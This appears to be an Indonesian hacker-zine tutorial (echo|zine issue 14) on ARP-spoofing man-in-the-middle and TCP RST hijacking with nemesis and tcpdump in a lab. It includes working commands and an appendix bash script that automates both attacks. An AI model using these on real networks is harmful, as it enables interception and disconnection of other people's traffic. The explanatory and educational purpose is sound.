@@ -1,0 +1,317 @@
+
+                           echo|zine, issue 14
+
+---------[ Nemesis Attacks: TCP Hijacking dan Man-in-the-Middle ]---------
+--------------------------------------------------------------------------
+----------------[ IbliZ PhoeniX <king_purba@yahoo.co.uk> ]----------------
+
+
+---// Pendahuluan
+
+Seperti diketahui protocol - protocol komunikasi komputer memiliki 
+kerawanan yang memungkinkan seseorang untuk melakukan attacking terhadap 
+jaringan. TCP dengan three-way handshakenya memungkinkan seseorang 
+melakukan spoofing IP untuk tujuan SYN flooding, ACK reply flooding, atau 
+TCP hijacking (misal: FIN hijack dan RST hijack). UDP bekerja tanpa 
+melakukan checking IP dan memungkinkan seseorang untuk melakukan flooding. 
+ICMP memungkinkan seseorang untuk melakukan flooding, smurfing attack, dan 
+ICMP Tunneling attack. Salah satu teknik serangan protokol TCP tentang 
+SYN flooding pernah penulis publikasikan di site pribadi penulis. 
+(http://kandangjamur.net/tutorial/ddos_syn.txt)
+
+Pada tulisan ini penulis hendak membahas jenis serangan ke host-host yang 
+berada di jaringan yakni TCP hijacking RST dan Man In The Middle attack. 
+Penulis menggunakan nemesis sebagai tools injeksi paket dan sebuah bash 
+script yang penulis buat beberapa waktu lalu. Nemesis awalnya di develop 
+oleh Mark Grimes (obecian) kemudian oleh Jeff Nathan (jnathan) - 
+(http://nemesis.sourceforge.net/), namun kemudian tools ini banyak 
+dimasukkan ke dalam package sistem operasi UNIX, sebagai contoh nemesis 
+bisa di dapatkan dari OpenBSD ports. 
+
+---//  Requirement
+
+Sebelum melanjutkan tulisan ini, ada baiknya penulis menyampaikan tools 
+apa saja yang dibutuhkan. Percobaan dilakukan penulis menggunakan mesin 
+OpenBSD 3.7 stable menggunakan tcpdump dan nemesis tentu saja library 
+seperti libpcap, libnet dan yang lainnya harus sudah ada di sistem. 
+Di mesin BSD cara paling mudah mendapatkan tools diatas adalah melalui 
+ports. Ports bisa anda setup melalui CVSup ataupun AnonCVS. Sebuah contoh
+instalasi nemesis melalui ports :
+
+secure-lab# cd /usr/ports
+secure-lab# make search key=nemesis
+Port:   nemesis-1.4beta3
+Path:   net/nemesis
+Info:   command line arbitrary packet builder
+Maint:  The OpenBSD ports mailing-list <ports@openbsd.org>
+Index:  net security
+L-deps: net::net/libnet
+B-deps:
+R-deps:
+Archs:  any
+secure-lab# cd net/nemesis
+secure-lab# make install
+
+Tunggu sampai proses instalasi selesai, andakaikan ada library yang 
+kurang/belum terinstal proses ini akan mencari sendiri library yang 
+kurang itu. Selain tools-tools tersebut anda juga membutuhkan sedikit
+pengetahuan tentang shell programming dan pemahaman protokol. Kemudian 
+sistem anda juga harus di konfigurasi supaya bisa digunakan untuk 
+memforward paket. Kalo di OpenBSD uncomment baris net.inet.ip.forwarding=1 
+dari /etc/sysctl.conf
+
+
+---//  Man-in-the-middle
+
+Man-in-the-middle (MITM) attack adalah salah satu serangan pada tahap 
+gaining access. Dengan cara ini seseorang bisa membaca, menginsert dan
+memalsukan data antara dua komputer yang saling terhubung sekalipun di 
+dalam switched network. Man-in-the-middle attack dapat dilakukan jika 
+komputer attacker berada di dalam satu network dengan dua komputer yang 
+lainnya Sesuai dengan namanya Man in the middle, attacker harus menempatkan 
+diri ditengah-tengah komunikasi antara komputer 1 dan komputer 2 sehingga
+attacker bisa mengcapture (sniff) semua data dari komputer 1 dan komputer 2.
+Anggaplah untuk komputer 1 adalah client dan komputer 2 adalah server, maka
+attacker harus menjadi legitimate server bagi real client dan juga sebagai
+legitimate client bagi real server. Cara yang penulis gunakan disini adalah
+menggunakan ARP spoofing dengan bantuan nemesis. Percobaan menggunakan 3
+komputer : 
+- komputer 1 IP 172.16.11.103 Fedora Core 4 + Open SSH,
+- komputer 2 IP 172.16.11.111 Windows XP service pack 2, dan 
+- komputer 172.16.11.234 OpenBSD 3.7, sebagai attacker. 
+
+Berikut step by step langkahnya di komputer attacker:
+
+secure-lab# ifconfig rl0
+rl0: flags=8843<UP,BROADCAST,RUNNING,SIMPLEX,MULTICAST> mtu 1500
+        address: 00:c0:26:6f:3a:1a
+        media: Ethernet 100baseTX
+        status: active
+        inet6 fe80::2c0:26ff:fe6f:3a1a%rl0 prefixlen 64 scopeid 0x1
+        inet 172.16.11.234 netmask 0xffffff00 broadcast 172.16.11.255
+secure-lab# ping 172.16.11.111
+PING 172.16.11.111 (172.16.11.111): 56 data bytes
+64 bytes from 172.16.11.111: icmp_seq=0 ttl=128 time=0.599 ms
+secure-lab# ping 172.16.11.103
+PING 172.16.11.103 (172.16.11.103): 56 data bytes
+64 bytes from 172.16.11.103: icmp_seq=0 ttl=64 time=1.022 ms
+secure-lab# arp -na
+? (172.16.11.1) at 00:11:bb:74:da:00 on rl0
+? (172.16.11.103) at 00:00:21:27:12:1f on rl0
+? (172.16.11.104) at 00:d0:68:00:f0:ce on rl0
+? (172.16.11.111) at 00:0c:76:24:ab:3c on rl0
+
+Satu hal yang menarik dari table entry ARP tadi adalah ketika 2 IP address 
+berbeda dengan MAC yang sama ada di dalam table ARP, maka IP address yang
+terdahulu akan dioverwrite oleh IP address yang baru. Lalu yang harus 
+dilakukan oleh attacker adalah mengirimkan ARP sehingga komputer 1 
+(172.16.11.103) percaya bahwa IP address komputer 2 (172.16.11.111) ada 
+di MAC address komputer attacker (00:c0:26:6f:3a:1a) dan mengirimkan ARP
+sehingga komputer 2 percaya bahwa IP address komputer 1 ada di MAC address
+komputer attacker juga. Dengan teknik ini semua paket data dari komputer 1 
+yang menuju ke komputer 2 akan melalui interface attacker. Disini penulis 
+menggunakan nemesis untuk menginjeksikan ARP ke komputer 1 dan komputer 2 -
+silakan baca nemesis arp help
+
+	nemesis arp -v -r -d <interface attacker> -S <ip komp 1> 
+		-D <ip komp 2> -h <MAC interface attacker> -m <MAC komp 1> 
+		-H <MAC interface attacker> -M <MAC komp 1>
+
+	nemesis arp -v -r -d <interface attacker> -S <ip komp 2> 
+		-D <ip komp 1> -h <MAC interface attacker> -m <MAC komp 2> 
+		-H <MAC interface attacker> -M <MAC komp 2>
+
+Kemudian, perintah ini harus diulang sehingga attacker dapat segera
+mengoverwrite ARP entry di kedua komputer. Untuk kasus percobaan penulis 
+seperti berikut :
+
+while true
+do
+        nemesis arp -v -r -d rl0 -S 172.16.11.103 -D 172.16.11.111 \
+        	-h 00:c0:26:6f:3a:1a -m 00:00:21:27:12:1f \
+        	-H 00:c0:26:6f:3a:1a -M 00:00:21:27:12:1f
+
+        nemesis arp -v -r -d rl0 -S 172.16.11.111 -D 172.16.11.103 \
+        	-h 00:c0:26:6f:3a:1a -m 00:0c:76:24:ab:3c \
+        	-H 00:c0:26:6f:3a:1a -M 00:0c:76:24:ab:3c
+
+        sleep 5;
+done
+
+Tentu saja dengan teknik ini memungkinkan attacker untuk melakukan sniffing 
+paket di dalam switched/non-switched network, mereset koneksi kedua komputer, 
+menginjeksikan paket dan tindakan lain yang mungkin merugikan komunikasi dua
+komputer yang sah.
+
+
+---//  TCP Hijacking (RST way)
+
+Sekarang penulis akan mengaplikasikan man in the middle attack untuk 
+mendiskonek dua komputer yang sedang saling terkoneksi. Sebelum terjadi 
+koneksi TCP sebuah komputer 1 akan mengirimkan paket SYN ke komputer 2 yang 
+akan diajak koneksi. Kemudian komputer 2 membalas dengan SYN/ACK ke 
+komputer 1, kemudian komunikasi terjadi setelah komputer 1 mengirimkan 
+ACK yang diterimanya ke komputer 2. Kemudian ketika akan terjadi diskoneksi 
+maka komputer yang mengakhiri session koneksi akan mengirimkan paket FIN 
+atau RST. Dari teori inilah penulis hendak membahas TCP hijacking 
+menggunakan RST. Untuk memperoleh sequence number yang tepat dari koneksi 
+dua komputer kita gunakan tcpdump sebagai penganalisa paket. Tcpdump dapat 
+digunakan untuk mengcapture koneksi establish dari dua komputer dengan 
+memberi filter flag ACK on. Untuk mengcapture paket dengan flags ACK on 
+kita bisa menggunakan filter "tcp[13] & 16 == 16". Setelah proses capturing 
+lalu kita susun paket baru dengan command line awk untuk memperoleh data
+capturing dari tcpdump. Langkah terakhir adalah menginjeksikan paket yang 
+sudah kita susun tadi dengan tools injeksi paket nemesis. Pada percobaan 
+penulis dilakukan diskoneksi komunikasi ssh dari komputer 172.16.11.111 
+ke openssh komputer 172.16.11.103 yang terhubung melalui unmanagable switch,
+sedangkan penulis menggunakan komputer ber IP 172.16.11.234. Langkah pertama
+yang penulis lakukan adalah melakukan man in the middle teknik kemudian 
+mencoba melakukan capturing paket dengan tcpdump dengan filter 
+"tcp[13] & 16 == 16 and host 172.16.11.103 and tcp port 22", jika ada paket 
+yang diterima berarti attacking step 1 (man in the middle) sukses.
+
+secure- lab# tcpdump -S -n -e -l "tcp[13] & 16 == 16" \
+				and host 172.16.11.103 and tcp port 22
+21:44:02.178872 0:c0:26:6f:3a:1a 0:c:76:24:ab:3c 0800 106: 172.16.11.103.22 > 172.16.11.111.2870
+: P 3657681251:3657681303(52) ack 450668431 win 8576 (DF) [tos 0x10]
+21:44:02.280459 0:c:76:24:ab:3c 0:c0:26:6f:3a:1a 0800 60: 172.16.11.111.2870 > 172.16.11.103.22: 
+. ack 3657681303 win 65119 (DF)
+21:44:02.280605 0:c0:26:6f:3a:1a 0:0:21:27:12:1f 0800 60: 172.16.11.111.2870 > 172.16.11.103.22: 
+. ack 3657681303 win 65119 (DF)
+
+Dari capturing paket yang didapat attacker dapat menyusun pake baru dengan
+menggunakan argumen-argumen command line awk. Dapat dilihat bahwa tcpdump 
+memberikan informasi mengenai IP address asal, IP address tujuan, port asal,
+port tujuan, MAC address asal dan MAC address tujuan. Selain itu didapat pula 
+bahwa tcpdump hanya mengcapture paket yang flag ACK nya diset on serta 
+memberitahukan sequence numbernya.
+
+mac_target = $2;
+mac_source = $3;
+split($6, dst, ".");
+split($8, src, ".");
+source_ip = src[1]"."src[2]"."src[3]"."src[4];
+target_ip = dst[1]"."dst[2]"."dst[3]"."dst[4];
+source_port = substr(src[5], 1, length(src[5])-1);
+target_port = dst[5];
+seq_num = $12;
+
+Seperti dilihat diatas kita bisa menyusun paket baru menggunakan argumen 
+command line awk (argumen awk ditandai dengan $). Langkah terakhir adalah
+menginjeksikan paket diatas ke koneksi komputer 172.16.11.111 dan komputer
+172.16.11.103 menggunakan nemesis sebagai berikut:
+
+	nemesis tcp -v -fR -S source_ip -x source_port -H mac_source \
+		-D target_ip -y target_port -M mac_target -s seq_num;
+
+Pada percobaan penulis koneksi ssh dari mesin windows ke mesin fedora core 
+4 menggunakan putty.exe sehingga ketika proses hijacking RST sukses akan 
+muncul box pesan "Network error : Software caused connection abort". 
+
+
+---//  Penutup
+
+Setiap protokol komunikasi komputer mempunyai kerawanan tersendiri mulai 
+dari protokol ethernet sampai TCP/IP. Setiap layer dalam model OSI bisa 
+diserang dengan cara tersendiri sehingga tidak ada salahnya sikap paranoid 
+kita terapkan untuk mengamankan jaringan kita. Seperti dua buah contoh 
+paparan diatas serangan terhadap ARP dan TCP menjadi sangat berbahaya 
+walaupun usaha menggunakan piranti-piranti jaringan yang lebih maju 
+(mengganti hub ke switch) sudah dilakukan. 
+
+Masih banyak lagi serangan-serangan lain yang ditujukan karena kerawanan
+protokol, repotnya serangan semacam ini sangat sulit dicegah apalagi ketika
+kemampuan utility jaringan kita terbatas. Sysadmin hanya mampu meminimalisasi
+resiko-resiko yang mungkin terjadi terhadap serangan pada protokol-protokol
+jaringan. Sikap melakukan blocking ICMP dan akses terhadap resource jaringan 
+bisa dijadikan langkah terakhir ketika utility yang ada tidak bisa mendukung metode yang lebih baik. 
+
+
+---//  Appendix 1 -- Bash script untuk MITM dan TPC Hijacking (RST way)
+
+
+#!/bin/sh
+if [ -z "$1" ]
+then
+	echo
+	echo "Ph03n1X - kandangjamur security"
+	echo "site: http://kandangjamur.net/"
+	echo "email: king_purba@yahoo.co.uk"
+	echo
+	echo "Usage: $0 <case>"
+	echo
+	echo "case:"
+	echo "MiM = Man in the Middle attack"
+	echo "hijack = TCP/IP RST hijacking"
+	echo
+	exit
+fi
+
+case "$1" in
+
+"MiM")
+	if [ -z "$7" ]
+	then
+		echo
+		echo "Usage: $0 <case> <interface> <ip host 1> <ip host 2> <MAC interface> <MAC host 1> <MAC host 2>"
+		echo
+		exit
+	fi
+
+	while true
+	do
+		nemesis arp -v -r -d $2 -S $3 -D $4 -h $5 -m $7 -H $5 -M $7
+		nemesis arp -v -r -d $2 -S $4 -D $3 -h $5 -m $6 -H $5 -M $6
+		sleep 5;
+	done
+	;;
+
+"hijack")
+	if [ -z "$3" ]
+	then
+		echo
+		echo "Usage : $0 <case> <ip target/server> <port>"
+		echo
+		exit
+	fi
+        
+	tcpdump -n -e -l "tcp[13] & 16 == 16" and \
+		host $2 and tcp port $3 | awk '{
+
+        CONVFMT="%u";
+        srand();
+        MAC_T = $2;
+        MAC_S = $3;
+        split($6, DST, ".");
+        split($8, SRC, ".");
+        IP_S = SRC[1]"."SRC[2]"."SRC[3]"."SRC[4];
+        IP_T = DST[1]"."DST[2]"."DST[3]"."DST[4];
+        PORT_S = substr(SRC[5], 1, length(SRC[5])-1);
+        PORT_T = DST[5];
+        SEQ_NUM = $12;
+        
+        hijack = "nemesis tcp -v -fR -S "IP_S" -x "PORT_S" -H "MAC_S" -D "IP_T" -y "PORT_T" -M "MAC_T" -s "SEQ_NUM;
+		system(hijack);
+		}'
+	;;
+
+*)
+        echo "YOUR CASE IS MISSED"
+        echo
+        ;;
+esac
+
+
+---//  Referensi
+
+	1. OpenBSD FAQ page http://openbsd.org/faq/index.html
+	2. http://en.wikipedia.org/wiki/Man_in_the_middle_attack
+	3. http://www.tldp.org/LDP/abs/html/
+	4. The Art of Exploitation
+
+
+---//  Greetz:
+
+Bp. Dani Adhipta as my wizard, KaDaL-X, nightlogin, zhainal, spyoff, cR4S3R, 
+no-profile, #indonesiahack, #ruanghacking, #e-c-h-o @dalnet
+
